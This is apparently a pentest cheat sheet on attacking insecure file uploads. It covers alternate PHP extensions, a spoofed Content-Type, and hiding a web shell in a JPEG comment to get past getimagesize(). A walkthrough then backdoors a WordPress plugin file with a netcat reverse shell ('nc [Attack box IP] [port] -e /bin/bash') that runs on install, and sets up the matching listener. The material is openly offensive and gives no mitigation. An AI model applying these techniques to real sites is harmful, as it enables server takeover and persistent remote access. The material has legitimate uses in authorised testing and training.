# Insecure File Upload

- Use a different PHP extension that the web server will then execute as PHP. For example if we change the extension of the PHP file from `.php` to `.php4, .pht, .phtml `

- Bypass mime type check
    
    Change the Content-Type from ‘application/x-php’ to ‘image/jpeg’

- Validating images using getimagesize() bypass

 ```
 This function returns the size of an image when it’s called on a valid image file. However, if this function is called on a file that does not contain a valid image header (meaning it is not a valid image), the function will return FALSE

method: embedded threats

apt-get install gimp
gimp [path to image file]

The next step is to select the image properties from the ‘Image’ menu as following or hit Alt+Return:
Then select the ‘Comment’ tab and insert the web shell code
After closing the properties window, save the file by choosing ‘Overwrite logo.jpg’ from the ‘File’ menu and click ‘Export’.
The last step is to append the .php extension to the file name with the following command:
mv logo.jpg logo.jpg.php
```   

- Injecting shellcode into plugins
```
Preparing the plugin file
For this example, we have downloaded a WordPress plugin called ‘Download Manager’ from which we will modify the plugin files to execute a reverse shell when the plugin is installed. The ‘Download Manager’ plugin was chosen randomly from the many WordPress plugins available and not because it contains any vulnerabilities. You should be able to use any plugin for this purpose.

Once the plugin has been downloaded it has to be unzipped. The next step is then to find a PHP file that is likely to be executed when WordPress installs the plugin (an alternative is to select a file that we can execute through a browser). Files that are likely executed on installation are index, configuration and function files. Let’s see if this plugin contains any of those.

The wpdm-functions.php appears to be the perfect candidate to be injected with the reverse shell code. It looks like something that will be executed during or after the installation process. Let’s open this file and inject the following code (which will initiate the reverse shell using Netcat): shell_exec("nc [Attack box IP] [port] -e /bin/bash");

We will need to compress the plugin folder into a zip archive again and upload it to WordPress for automatic installation, but before that, we must set up a Netcat listener on the attack box to intercept the reverse shell with the following command: nc -lvp 

Uploading and executing the plugin file
With Netcat listening on the attack box, you are ready to upload the plugin folder. Go to the WordPress Plugins -> ‘Add New’ page and click the ‘Upload Plugin’ button to add a new plugin:

Then click ‘Browse’ select the plugin file you want and press the ‘Install Now’ button:
The plugin file will now be uploaded to the web server and WordPress will install the plugin automatically. The final step is to activate the plugin by pressing the blue ‘Activate Plugin’ button
```